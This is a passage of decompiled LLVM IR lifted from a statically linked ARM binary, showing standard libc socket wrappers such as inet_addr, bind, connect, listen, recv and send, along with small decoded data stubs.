dec_label_pc_137b0:                               ; preds = %dec_label_pc_13798, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13798, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_137bc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_137bc, i32* @r1, align 4
  %v0_137c0 = call i32 @inet_aton()
  %v2_137c4 = icmp eq i32 %v0_137c0, 0
  %v4_137c8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_137c4, i32 -1, i32 %v4_137c8
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137dc = load i32, i32* @r7, align 4
  store i32 %v3_137dc, i32* %stack_var_-8, align 4
  %v0_137e8 = load i32, i32* @r0, align 4
  store i32 %v0_137e8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_137e8, -4095
  br i1 %tmp, label %dec_label_pc_13810, label %dec_label_pc_137f8

dec_label_pc_137f8:                               ; preds = %entry
  %v0_137fc = call i32 @__aeabi_read_tp()
  %v3_13800 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13800 = sext i16 %v3_13800 to i32
  %v0_13804 = load i32, i32* %r2.global-to-local, align 4
  %v1_13804 = sub i32 0, %v0_13804
  store i32 %v1_13804, i32* %r2.global-to-local, align 4
  %v3_13808 = add i32 %v4_13800, %v0_137fc
  %v4_13808 = inttoptr i32 %v3_13808 to i32*
  store i32 %v1_13804, i32* %v4_13808, align 4
  %v2_13810.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13810

dec_label_pc_13810:                               ; preds = %entry, %dec_label_pc_137f8
  %v1_13814 = phi i32 [ %v0_137e8, %entry ], [ -1, %dec_label_pc_137f8 ]
  %v2_13810 = phi i32 [ %v3_137dc, %entry ], [ %v2_13810.pre, %dec_label_pc_137f8 ]
  store i32 %v2_13810, i32* @r7, align 4
  ret i32 %v1_13814

; uselistorder directives
  uselistorder i32 %v0_137e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13810, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13818:
  %v0_13818 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13818, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13818
  %v2_1381c = load i32, i32* @r8, align 4
  %v5_1381c = sdiv i32 %v2_1381c, 33554432
  %v6_1381c = and i32 %v5_1381c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13818, %bb
  %v7_1381c = phi i32 [ %arg1, %dec_label_pc_13818 ], [ %v6_1381c, %bb ]
  ret i32 %v7_1381c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_13824 = load i32, i32* @r4, align 4
  %v9_13824 = load i32, i32* @r6, align 4
  %v12_13824 = load i32, i32* @r7, align 4
  %v4_13830 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_13834 = icmp eq i32 %v4_13830, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_13834, label %dec_label_pc_1384c, label %entry.dec_label_pc_13858_crit_edge

entry.dec_label_pc_13858_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13858

dec_label_pc_1384c:                               ; preds = %entry
  store i32 %v3_13824, i32* @r4, align 4
  store i32 %v9_13824, i32* @r6, align 4
  store i32 %v12_13824, i32* @r7, align 4
  %v0_13854 = call i32 @__sys_accept()
  br label %dec_label_pc_13858

dec_label_pc_13858:                               ; preds = %entry.dec_label_pc_13858_crit_edge, %dec_label_pc_1384c
  %v0_13858 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13858, i32* @r5, align 4
  %v0_13868 = load i32, i32* @r4, align 4
  store i32 %v0_13868, i32* @r0, align 4
  %v0_1386c = call i32 @__sys_accept()
  store i32 %v0_1386c, i32* @r4, align 4
  %v0_13874 = load i32, i32* @r5, align 4
  %v1_13878 = call i32 @__libc_disable_asynccancel(i32 %v0_13874)
  %v0_1387c = load i32, i32* @r4, align 4
  store i32 %v12_13824, i32* @r7, align 4
  ret i32 %v0_1387c

; uselistorder directives
  uselistorder label %dec_label_pc_13858, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13894 = load i32, i32* @r7, align 4
  store i32 %v3_13894, i32* %stack_var_-8, align 4
  %v0_138a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_138a0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_138a0, -4095
  br i1 %tmp, label %dec_label_pc_138c8, label %dec_label_pc_138b0

dec_label_pc_138b0:                               ; preds = %entry
  %v0_138b4 = call i32 @__aeabi_read_tp()
  %v3_138b8 = load i16, i16* @global_var_244d0.762, align 2
  %v4_138b8 = sext i16 %v3_138b8 to i32
  %v0_138bc = load i32, i32* %r2.global-to-local, align 4
  %v1_138bc = sub i32 0, %v0_138bc
  store i32 %v1_138bc, i32* %r2.global-to-local, align 4
  %v3_138c0 = add i32 %v4_138b8, %v0_138b4
  %v4_138c0 = inttoptr i32 %v3_138c0 to i32*
  store i32 %v1_138bc, i32* %v4_138c0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_138c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_138c8

dec_label_pc_138c8:                               ; preds = %entry, %dec_label_pc_138b0
  %v1_138cc = phi i32 [ %v0_138a0, %entry ], [ -1, %dec_label_pc_138b0 ]
  %v2_138c8 = phi i32 [ %v3_13894, %entry ], [ %v2_138c8.pre, %dec_label_pc_138b0 ]
  store i32 %v2_138c8, i32* @r7, align 4
  ret i32 %v1_138cc

; uselistorder directives
  uselistorder i32 %v0_138a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_138c8, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_138d0:
  %v0_138d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_138d0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_138d0
  %v2_138d0 = load i32, i32* @sl, align 4
  %v8_138d0 = shl i32 %v2_138d0, %arg2
  %v9_138d0 = and i32 %v8_138d0, %arg1
  %v3_138d4 = load i32, i32* @ip, align 4
  %v8_138d4 = shl i32 %v9_138d0, %v3_138d4
  %v9_138d4 = and i32 %v8_138d4, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_138d0, %bb
  %v10_138d4 = phi i32 [ %arg1, %dec_label_pc_138d0 ], [ %v9_138d4, %bb ]
  ret i32 %v10_138d4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_138d8 = load i32, i32* @r7, align 4
  store i32 %v3_138d8, i32* %stack_var_-8, align 4
  %v0_138e4 = load i32, i32* @r0, align 4
  store i32 %v0_138e4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_138e4, -4095
  br i1 %tmp, label %dec_label_pc_1390c, label %dec_label_pc_138f4

dec_label_pc_138f4:                               ; preds = %entry
  %v0_138f8 = call i32 @__aeabi_read_tp()
  %v3_138fc = load i16, i16* @global_var_244d0.762, align 2
  %v4_138fc = sext i16 %v3_138fc to i32
  store i32 %v4_138fc, i32* @r3, align 4
  %v0_13900 = load i32, i32* %r2.global-to-local, align 4
  %v1_13900 = sub i32 0, %v0_13900
  store i32 %v1_13900, i32* %r2.global-to-local, align 4
  %v3_13904 = add i32 %v4_138fc, %v0_138f8
  %v4_13904 = inttoptr i32 %v3_13904 to i32*
  store i32 %v1_13900, i32* %v4_13904, align 4
  %v2_1390c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1390c

dec_label_pc_1390c:                               ; preds = %entry, %dec_label_pc_138f4
  %v1_13910 = phi i32 [ %v0_138e4, %entry ], [ -1, %dec_label_pc_138f4 ]
  %v2_1390c = phi i32 [ %v3_138d8, %entry ], [ %v2_1390c.pre, %dec_label_pc_138f4 ]
  store i32 %v2_1390c, i32* @r7, align 4
  ret i32 %v1_13910

; uselistorder directives
  uselistorder i32 %v0_138e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1390c, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13914:
  %v0_13914 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13914, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13914
  %v2_13918 = load i32, i32* @ip, align 4
  %v5_13918 = sdiv i32 %v2_13918, 8388608
  %v6_13918 = and i32 %v5_13918, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13914, %bb
  %v7_13918 = phi i32 [ %arg1, %dec_label_pc_13914 ], [ %v6_13918, %bb ]
  ret i32 %v7_13918

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13920 = load i32, i32* @r4, align 4
  store i32 %v3_13920, i32* %stack_var_-20, align 4
  %v6_13920 = load i32, i32* @r5, align 4
  %v9_13920 = load i32, i32* @r6, align 4
  %v12_13920 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r3, align 4
  %v4_1392c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  store i32 %v4_1392c, i32* @ip, align 4
  %v2_13930 = icmp eq i32 %v4_1392c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_13930, label %dec_label_pc_13948, label %entry.dec_label_pc_13954_crit_edge

entry.dec_label_pc_13954_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13954

dec_label_pc_13948:                               ; preds = %entry
  store i32 %v3_13920, i32* @r4, align 4
  store i32 %v9_13920, i32* @r6, align 4
  store i32 %v12_13920, i32* @r7, align 4
  %v0_13950 = call i32 @__sys_connect()
  br label %dec_label_pc_13954

dec_label_pc_13954:                               ; preds = %entry.dec_label_pc_13954_crit_edge, %dec_label_pc_13948
  %v0_13954 = call i32 @__libc_enable_asynccancel()
  %v0_13958 = load i32, i32* @r6, align 4
  store i32 %v0_13958, i32* @r1, align 4
  store i32 %v0_13954, i32* @r5, align 4
  %v0_13964 = load i32, i32* @r4, align 4
  store i32 %v0_13964, i32* @r0, align 4
  %v0_13968 = call i32 @__sys_connect()
  store i32 %v0_13968, i32* @r4, align 4
  %v0_13970 = load i32, i32* @r5, align 4
  %v1_13974 = call i32 @__libc_disable_asynccancel(i32 %v0_13970)
  %v0_13978 = load i32, i32* @r4, align 4
  %v2_13980 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13980, i32* @r4, align 4
  store i32 %v6_13920, i32* @r5, align 4
  store i32 %v9_13920, i32* @r6, align 4
  store i32 %v12_13920, i32* @r7, align 4
  ret i32 %v0_13978

; uselistorder directives
  uselistorder label %dec_label_pc_13954, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13990 = load i32, i32* @r7, align 4
  store i32 %v3_13990, i32* %stack_var_-8, align 4
  %v0_1399c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1399c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1399c, -4095
  br i1 %tmp, label %dec_label_pc_139c4, label %dec_label_pc_139ac

dec_label_pc_139ac:                               ; preds = %entry
  %v0_139b0 = call i32 @__aeabi_read_tp()
  %v3_139b4 = load i16, i16* @global_var_244d0.762, align 2
  %v4_139b4 = sext i16 %v3_139b4 to i32
  %v0_139b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_139b8 = sub i32 0, %v0_139b8
  store i32 %v1_139b8, i32* %r2.global-to-local, align 4
  %v3_139bc = add i32 %v4_139b4, %v0_139b0
  %v4_139bc = inttoptr i32 %v3_139bc to i32*
  store i32 %v1_139b8, i32* %v4_139bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_139c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_139c4

dec_label_pc_139c4:                               ; preds = %entry, %dec_label_pc_139ac
  %v1_139c8 = phi i32 [ %v0_1399c, %entry ], [ -1, %dec_label_pc_139ac ]
  %v2_139c4 = phi i32 [ %v3_13990, %entry ], [ %v2_139c4.pre, %dec_label_pc_139ac ]
  store i32 %v2_139c4, i32* @r7, align 4
  ret i32 %v1_139c8

; uselistorder directives
  uselistorder i32 %v0_1399c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139c4, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_139cc:
  %v0_139cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_139cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_139cc
  %v2_139d0 = load i32, i32* @r4, align 4
  %v3_139d0 = load i32, i32* @fp, align 4
  %v8_139d0 = shl i32 %v2_139d0, %v3_139d0
  %v9_139d0 = and i32 %v8_139d0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_139cc, %bb
  %v10_139d0 = phi i32 [ %arg1, %dec_label_pc_139cc ], [ %v9_139d0, %bb ]
  ret i32 %v10_139d0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_139d4 = load i32, i32* @r4, align 4
  store i32 %v3_139d4, i32* %stack_var_-12, align 4
  %v0_139e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_139e4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_139e4, -4095
  br i1 %tmp, label %dec_label_pc_13a0c, label %dec_label_pc_139f4

dec_label_pc_139f4:                               ; preds = %entry
  %v0_139f8 = call i32 @__aeabi_read_tp()
  %v3_139fc = load i16, i16* @global_var_244d0.762, align 2
  %v4_139fc = sext i16 %v3_139fc to i32
  %v0_13a00 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a00 = sub i32 0, %v0_13a00
  store i32 %v1_13a00, i32* %r2.global-to-local, align 4
  %v3_13a04 = add i32 %v4_139fc, %v0_139f8
  %v4_13a04 = inttoptr i32 %v3_13a04 to i32*
  store i32 %v1_13a00, i32* %v4_13a04, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13a0c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13a0c

dec_label_pc_13a0c:                               ; preds = %entry, %dec_label_pc_139f4
  %v1_13a10 = phi i32 [ %v0_139e4, %entry ], [ -1, %dec_label_pc_139f4 ]
  %v2_13a0c = phi i32 [ %v3_139d4, %entry ], [ %v2_13a0c.pre, %dec_label_pc_139f4 ]
  store i32 %v2_13a0c, i32* @r4, align 4
  ret i32 %v1_13a10

; uselistorder directives
  uselistorder i32 %v0_139e4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a0c, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13a14:
  %v0_13a14 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13a14, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13a14
  %v2_13a18 = load i32, i32* @ip, align 4
  %v5_13a18 = sdiv i32 %v2_13a18, 2097152
  %v6_13a18 = and i32 %v5_13a18, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13a14, %bb
  %v7_13a18 = phi i32 [ %arg1, %dec_label_pc_13a14 ], [ %v6_13a18, %bb ]
  ret i32 %v7_13a18

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13a1c = load i32, i32* @r7, align 4
  store i32 %v3_13a1c, i32* %stack_var_-8, align 4
  %v0_13a28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13a28, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13a28, -4095
  br i1 %tmp, label %dec_label_pc_13a50, label %dec_label_pc_13a38

dec_label_pc_13a38:                               ; preds = %entry
  %v0_13a3c = call i32 @__aeabi_read_tp()
  %v3_13a40 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13a40 = sext i16 %v3_13a40 to i32
  %v0_13a44 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a44 = sub i32 0, %v0_13a44
  store i32 %v1_13a44, i32* %r2.global-to-local, align 4
  %v3_13a48 = add i32 %v4_13a40, %v0_13a3c
  %v4_13a48 = inttoptr i32 %v3_13a48 to i32*
  store i32 %v1_13a44, i32* %v4_13a48, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13a50.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a50

dec_label_pc_13a50:                               ; preds = %entry, %dec_label_pc_13a38
  %v1_13a54 = phi i32 [ %v0_13a28, %entry ], [ -1, %dec_label_pc_13a38 ]
  %v2_13a50 = phi i32 [ %v3_13a1c, %entry ], [ %v2_13a50.pre, %dec_label_pc_13a38 ]
  store i32 %v2_13a50, i32* @r7, align 4
  ret i32 %v1_13a54

; uselistorder directives
  uselistorder i32 %v0_13a28, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a50, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13a5c = load i32, i32* @r7, align 4
  store i32 %v3_13a5c, i32* %stack_var_-8, align 4
  %v0_13a68 = load i32, i32* @r0, align 4
  store i32 %v0_13a68, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13a68, -4095
  br i1 %tmp, label %dec_label_pc_13a90, label %dec_label_pc_13a78

dec_label_pc_13a78:                               ; preds = %entry
  %v0_13a7c = call i32 @__aeabi_read_tp()
  %v3_13a80 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13a80 = sext i16 %v3_13a80 to i32
  %v0_13a84 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a84 = sub i32 0, %v0_13a84
  store i32 %v1_13a84, i32* %r2.global-to-local, align 4
  %v3_13a88 = add i32 %v4_13a80, %v0_13a7c
  %v4_13a88 = inttoptr i32 %v3_13a88 to i32*
  store i32 %v1_13a84, i32* %v4_13a88, align 4
  %v2_13a90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a90

dec_label_pc_13a90:                               ; preds = %entry, %dec_label_pc_13a78
  %v1_13a94 = phi i32 [ %v0_13a68, %entry ], [ -1, %dec_label_pc_13a78 ]
  %v2_13a90 = phi i32 [ %v3_13a5c, %entry ], [ %v2_13a90.pre, %dec_label_pc_13a78 ]
  store i32 %v2_13a90, i32* @r7, align 4
  ret i32 %v1_13a94

; uselistorder directives
  uselistorder i32 %v0_13a68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13a90, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13a98:
  %v0_13a98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13a98, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13a98
  %v2_13a9c = load i32, i32* @r8, align 4
  %v5_13a9c = sdiv i32 %v2_13a9c, 1048576
  %v6_13a9c = and i32 %v5_13a9c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13a98, %bb
  %v7_13a9c = phi i32 [ %arg1, %dec_label_pc_13a98 ], [ %v6_13a9c, %bb ]
  ret i32 %v7_13a9c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13aa4 = load i32, i32* @r4, align 4
  store i32 %v3_13aa4, i32* %stack_var_-24, align 4
  %v6_13aa4 = load i32, i32* @r5, align 4
  %v9_13aa4 = load i32, i32* @r6, align 4
  %v12_13aa4 = load i32, i32* @r7, align 4
  %v15_13aa4 = load i32, i32* @r8, align 4
  %v18_13aa4 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @ip, align 4
  %v4_13ab0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_13ab4 = icmp eq i32 %v4_13ab0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_13ab4, label %dec_label_pc_13acc, label %entry.dec_label_pc_13ad4_crit_edge

entry.dec_label_pc_13ad4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13ad4

dec_label_pc_13acc:                               ; preds = %entry
  store i32 %v3_13aa4, i32* @r4, align 4
  store i32 %v9_13aa4, i32* @r6, align 4
  store i32 %v12_13aa4, i32* @r7, align 4
  store i32 %v15_13aa4, i32* @r8, align 4
  %v0_13ad0 = call i32 @__sys_recv()
  br label %dec_label_pc_13ad4

dec_label_pc_13ad4:                               ; preds = %entry.dec_label_pc_13ad4_crit_edge, %dec_label_pc_13acc
  %v0_13ad4 = call i32 @__libc_enable_asynccancel()
  %v0_13ad8 = load i32, i32* @r6, align 4
  store i32 %v0_13ad8, i32* @r1, align 4
  store i32 %v0_13ad4, i32* @r5, align 4
  %v0_13ae8 = load i32, i32* @r4, align 4
  store i32 %v0_13ae8, i32* @r0, align 4
  %v0_13aec = call i32 @__sys_recv()
  store i32 %v0_13aec, i32* @r4, align 4
  %v0_13af4 = load i32, i32* @r5, align 4
  %v1_13af8 = call i32 @__libc_disable_asynccancel(i32 %v0_13af4)
  %v0_13afc = load i32, i32* @r4, align 4
  %v2_13b00 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13b00, i32* @r4, align 4
  store i32 %v6_13aa4, i32* @r5, align 4
  store i32 %v9_13aa4, i32* @r6, align 4
  store i32 %v12_13aa4, i32* @r7, align 4
  store i32 %v15_13aa4, i32* @r8, align 4
  store i32 %v18_13aa4, i32* @lr, align 4
  ret i32 %v0_13afc

; uselistorder directives
  uselistorder label %dec_label_pc_13ad4, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13b10 = load i32, i32* @r4, align 4
  store i32 %v3_13b10, i32* %stack_var_-16, align 4
  %v0_13b24 = load i32, i32* @r0, align 4
  store i32 %v0_13b24, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b24, -4095
  br i1 %tmp, label %dec_label_pc_13b4c, label %dec_label_pc_13b34

dec_label_pc_13b34:                               ; preds = %entry
  %v0_13b38 = call i32 @__aeabi_read_tp()
  %v3_13b3c = load i16, i16* @global_var_244d0.762, align 2
  %v4_13b3c = sext i16 %v3_13b3c to i32
  %v0_13b40 = load i32, i32* %r2.global-to-local, align 4
  %v1_13b40 = sub i32 0, %v0_13b40
  store i32 %v1_13b40, i32* %r2.global-to-local, align 4
  %v3_13b44 = add i32 %v4_13b3c, %v0_13b38
  %v4_13b44 = inttoptr i32 %v3_13b44 to i32*
  store i32 %v1_13b40, i32* %v4_13b44, align 4
  %v2_13b4c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13b4c

dec_label_pc_13b4c:                               ; preds = %entry, %dec_label_pc_13b34
  %v1_13b50 = phi i32 [ %v0_13b24, %entry ], [ -1, %dec_label_pc_13b34 ]
  %v2_13b4c = phi i32 [ %v3_13b10, %entry ], [ %v2_13b4c.pre, %dec_label_pc_13b34 ]
  store i32 %v2_13b4c, i32* @r4, align 4
  ret i32 %v1_13b50

; uselistorder directives
  uselistorder i32 %v0_13b24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b4c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13b58 = load i32, i32* @r4, align 4
  store i32 %v3_13b58, i32* %stack_var_-32, align 4
  %v6_13b58 = load i32, i32* @r5, align 4
  %v9_13b58 = load i32, i32* @r6, align 4
  %v12_13b58 = load i32, i32* @r7, align 4
  %v15_13b58 = load i32, i32* @r8, align 4
  %v18_13b58 = load i32, i32* @sb, align 4
  %v21_13b58 = load i32, i32* @sl, align 4
  %v24_13b58 = load i32, i32* @lr, align 4
  %v4_13b68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_13b70 = icmp eq i32 %v4_13b68, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_13b70, label %dec_label_pc_13b90, label %dec_label_pc_13b9c

dec_label_pc_13b90:                               ; preds = %entry
  store i32 %v3_13b58, i32* @r4, align 4
  store i32 %v12_13b58, i32* @r7, align 4
  store i32 %v15_13b58, i32* @r8, align 4
  store i32 %v18_13b58, i32* %sb.global-to-local, align 4
  %v0_13b98 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_13b9c

dec_label_pc_13b9c:                               ; preds = %entry, %dec_label_pc_13b90
  %v0_13b9c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13b9c, i32* @r5, align 4
  %v0_13bb0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13bb0, i32* @r0, align 4
  %v0_13bb8 = call i32 @__sys_recvfrom()
  store i32 %v0_13bb8, i32* @r4, align 4
  %v0_13bc0 = load i32, i32* @r5, align 4
  %v1_13bc4 = call i32 @__libc_disable_asynccancel(i32 %v0_13bc0)
  %v0_13bc8 = load i32, i32* @r4, align 4
  %v2_13bd0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13bd0, i32* @r4, align 4
  store i32 %v6_13b58, i32* @r5, align 4
  store i32 %v9_13b58, i32* @r6, align 4
  store i32 %v12_13b58, i32* @r7, align 4
  store i32 %v15_13b58, i32* @r8, align 4
  store i32 %v18_13b58, i32* @sb, align 4
  store i32 %v21_13b58, i32* @sl, align 4
  store i32 %v24_13b58, i32* @lr, align 4
  ret i32 %v0_13bc8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b9c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13be0 = load i32, i32* @r7, align 4
  store i32 %v3_13be0, i32* %stack_var_-8, align 4
  %v0_13bec = load i32, i32* @r0, align 4
  store i32 %v0_13bec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13bec, -4095
  br i1 %tmp, label %dec_label_pc_13c14, label %dec_label_pc_13bfc

dec_label_pc_13bfc:                               ; preds = %entry
  %v0_13c00 = call i32 @__aeabi_read_tp()
  %v3_13c04 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13c04 = sext i16 %v3_13c04 to i32
  store i32 %v4_13c04, i32* @r3, align 4
  %v0_13c08 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c08 = sub i32 0, %v0_13c08
  store i32 %v1_13c08, i32* %r2.global-to-local, align 4
